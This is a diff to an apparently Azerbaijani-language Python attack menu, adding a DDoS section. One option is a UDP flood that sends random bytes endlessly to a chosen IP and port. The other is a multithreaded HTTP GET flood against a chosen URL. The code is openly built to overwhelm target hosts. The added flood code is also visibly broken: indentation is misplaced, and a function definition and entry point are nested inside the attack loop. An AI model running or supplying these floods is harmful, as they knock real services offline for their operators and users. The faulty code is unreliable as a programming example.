@@ -287,18 +287,42 @@ if(dil == "1"):
      #  ATTACK- DDOS           #
      #  HUCUMA HAZIRDIR        #
      ###########################
+     +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+     +  NOV SECIMI:::                                                          +
+     +  1:AZ ETKILI(SISTEMI DAHA AZ YORUR)--(TÖVSİYYE--BIR NEÇE CİHAZDAN EDİN) +
+     +  2:ÇOX ETKİLİ(SİSTEMDE KASMA,DONMA OLA BİLER                            +
+     +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
      """, Colors.RED)
-    
-     hedef_ip = input("Hedef ip daxil et:")
-     hedef_port = int(input("Hedef port:"))
+     dos = input("Seçim::: ")
+     if(dos == "1"):
+      
+      hedef_ip = input("Hedef ip daxil et:")
+      hedef_port = int(input("Hedef port:"))
 
-     bytes = random._urandom(3000)
-     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-     sayac = 0
-     while True:
-         sock.sendto(bytes, (hedef_ip, hedef_port))
-         sayac += 1
-         print("\033[92mHUCUM EDILIR , gonderilen byte:::%s\033[0m" % (sayac))
+      bytes = random._urandom(3000)
+      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      sayac = 0
+      while True:
+          sock.sendto(bytes, (hedef_ip, hedef_port))
+          sayac += 1
+          print("\033[92mHUCUM EDILIR , gonderilen byte:::%s\033[0m" % (sayac))
+      elif(dos == "2"):
+       import requests
+       import threading
+       def ddos(target):
+        while True:
+         try:
+             requests.get(target)
+         except:
+             pass
+         def main():
+          target = input('Enter target URL: ')
+          thread_count = int(input('Enter number of threads: '))
+          for _ in range(thread_count):
+           threading.Thread(target=ddos, args=(target,)).start()
+          if __name__ == '__main__':
+           main()
+           
 
  elif secim == '4':
      print_colored("""
